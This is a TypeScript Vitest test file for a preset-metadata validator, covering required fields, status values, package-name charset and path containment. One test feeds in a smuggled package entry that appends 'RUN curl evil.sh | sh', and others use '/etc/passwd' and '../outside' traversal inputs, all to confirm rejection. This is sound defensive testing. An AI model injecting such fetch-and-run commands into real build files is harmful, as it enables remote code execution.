import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";

import { afterEach, beforeEach, describe, expect, it } from "vitest";

import { isPathContained, listPresets, validatePresetMeta } from "../src/presets";

let repoRoot: string;

beforeEach(() => {
  repoRoot = mkdtempSync(path.join(tmpdir(), "presets-test-"));
});

afterEach(() => {
  rmSync(repoRoot, { recursive: true, force: true });
});

function writePreset(id: string, content: unknown): void {
  const dir = path.join(repoRoot, "presets", id);
  mkdirSync(dir, { recursive: true });
  writeFileSync(path.join(dir, "preset.json"), JSON.stringify(content));
}

const VALID_DEMO = {
  id: "demo",
  label: "Untangle demo",
  description: "Full working micro-SaaS",
  appDir: "apps/demo",
  status: "available",
  packages: [],
};

describe("listPresets", () => {
  it("returns [] when there's no presets/ directory", () => {
    expect(listPresets(repoRoot)).toEqual([]);
  });

  it("reads and validates every presets/<id>/preset.json, sorted by id", () => {
    writePreset("demo", VALID_DEMO);
    writePreset("api-only", {
      id: "api-only",
      label: "Micro API",
      description: "API-only shape",
      appDir: "apps/api-only",
      status: "coming-soon",
      packages: [],
    });

    const presets = listPresets(repoRoot);
    expect(presets.map((p) => p.id)).toEqual(["api-only", "demo"]);
    expect(presets[1].status).toBe("available");
    expect(presets[1].sourceDir).toBe(path.join("presets", "demo"));
  });
});

describe("validatePresetMeta", () => {
  it("accepts a well-formed preset.json", () => {
    const meta = validatePresetMeta(VALID_DEMO, "presets/demo", repoRoot, "demo");
    expect(meta).toMatchObject({ id: "demo", status: "available", packages: [] });
  });

  it("rejects a non-object payload", () => {
    expect(() => validatePresetMeta("nope", "presets/demo", repoRoot)).toThrow(
      /must be a JSON object/,
    );
  });

  it("rejects a missing required string field", () => {
    const rest: Record<string, unknown> = { ...VALID_DEMO };
    delete rest.label;
    expect(() => validatePresetMeta(rest, "presets/demo", repoRoot)).toThrow(/"label"/);
  });

  it("rejects an invalid status", () => {
    expect(() =>
      validatePresetMeta({ ...VALID_DEMO, status: "beta" }, "presets/demo", repoRoot),
    ).toThrow(/"status"/);
  });

  it("rejects an id that doesn't match its directory name", () => {
    expect(() => validatePresetMeta(VALID_DEMO, "presets/other", repoRoot, "other")).toThrow(
      /does not match its directory name/,
    );
  });

  it("rejects null and non-array 'packages'", () => {
    expect(() =>
      validatePresetMeta({ ...VALID_DEMO, packages: "nope" }, "presets/demo", repoRoot),
    ).toThrow(/"packages"/);
    expect(() =>
      validatePresetMeta({ ...VALID_DEMO, packages: null }, "presets/demo", repoRoot),
    ).toThrow(/"packages"/);
  });

  it("rejects a 'packages' array containing a non-string or empty-string entry", () => {
    expect(() =>
      validatePresetMeta({ ...VALID_DEMO, packages: [""] }, "presets/demo", repoRoot),
    ).toThrow(/"packages"/);
    expect(() =>
      validatePresetMeta({ ...VALID_DEMO, packages: [42] }, "presets/demo", repoRoot),
    ).toThrow(/"packages"/);
  });

  it("rejects a 'packages' entry outside the directory-name charset", () => {
    expect(() =>
      validatePresetMeta({ ...VALID_DEMO, packages: ["../outside"] }, "presets/demo", repoRoot),
    ).toThrow(/"packages"/);
    expect(() =>
      validatePresetMeta(
        { ...VALID_DEMO, packages: ["core\nRUN curl evil.sh | sh"] },
        "presets/demo",
        repoRoot,
      ),
    ).toThrow(/"packages"/);
    expect(() =>
      validatePresetMeta({ ...VALID_DEMO, packages: ["Core"] }, "presets/demo", repoRoot),
    ).toThrow(/"packages"/);
  });

  it("accepts an array 'packages' — shape-only, no on-disk existence check here", () => {
    const meta = validatePresetMeta(
      { ...VALID_DEMO, packages: ["core"] },
      "presets/demo",
      repoRoot,
    );
    expect(meta.packages).toEqual(["core"]);
  });

  it("rejects an absolute appDir", () => {
    expect(() =>
      validatePresetMeta({ ...VALID_DEMO, appDir: "/etc/passwd" }, "presets/demo", repoRoot),
    ).toThrow(/"appDir" must be repo-relative/);
  });

  it("rejects an appDir that resolves outside repoRoot", () => {
    expect(() =>
      validatePresetMeta({ ...VALID_DEMO, appDir: "../outside" }, "presets/demo", repoRoot),
    ).toThrow(/resolves outside the repo root/);
  });
});

describe("isPathContained", () => {
  it("is true for the parent itself", () => {
    expect(isPathContained(repoRoot, repoRoot)).toBe(true);
  });

  it("is true for a nested child", () => {
    expect(isPathContained(repoRoot, path.join(repoRoot, "apps", "demo"))).toBe(true);
  });

  it("is false for a sibling directory", () => {
    expect(isPathContained(repoRoot, path.join(repoRoot, "..", "sibling"))).toBe(false);
  });

  it("is false for an unrelated absolute path", () => {
    expect(isPathContained(repoRoot, "/etc/passwd")).toBe(false);
  });
});
